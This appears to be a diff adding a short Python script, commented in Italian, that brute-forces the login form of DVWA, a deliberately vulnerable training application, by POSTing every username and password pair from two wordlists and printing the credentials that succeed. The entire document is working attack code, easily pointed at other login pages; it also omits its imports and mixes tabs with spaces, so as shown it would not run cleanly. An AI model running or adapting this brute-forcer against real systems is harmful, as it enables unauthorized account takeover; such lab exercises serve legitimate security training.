@@ -1,0 +1,42 @@
+#Input file da cartella locale dove e' presente il file.py + file.txt
+username = open('usernames.txt')
+password = open('passwords.txt')
+
+#Trasformazione file.txt in stringhe
+lista_u = username.readlines()
+lista_psw = password.readlines()
+
+#Input target
+IP_target = str(input("Inserisci l'IP del target : "))
+PORT_target = int(input("Inserisci la PORTA target : "))
+
+#Variabili contenenti i dati delle possibili combinazioni di accesso
+login_u = str("")
+login_p = str ("")
+
+#Visualizzazione a schermo attesa esecuzione
+print("\nProcesso in corso, attendere prego...\n")
+
+#Esecuzione Brute Force
+for user in lista_u :
+	user = user.rstrip()
+	for pwd in lista_psw :
+		pwd = pwd.rstrip()
+
+		#Creazione pacchetto di login
+		post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd, 'Login': "Login"})
+		headers = {"Content-type": "application/x-www-form-urlencoded", "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}
+		
+		#Invio pacchetto di login tramite modalita' POST
+                conn = http.client.HTTPConnection(IP_target, PORT_target)
+                conn.request("POST", "/dvwa/login.php", post_parameters, headers) 
+		response = conn.getresponse()
+		
+		#Output usato per identificare la locazione di riferimento di ritorno quando si fallisce l'accesso
+		#print("Sei qui : ", response.getheader('location')) 
+		
+		#Se non si ritorna alla pagina di accesso, stampa la posizione diversa e con quali credenziali ci si accede
+		if(response.getheader('location') != "login.php") : 
+			print("Accesso effettuato in : ", response.getheader('location')) 
+			print("Con Username : ",user) 
+			print("Con Password : ",pwd) 
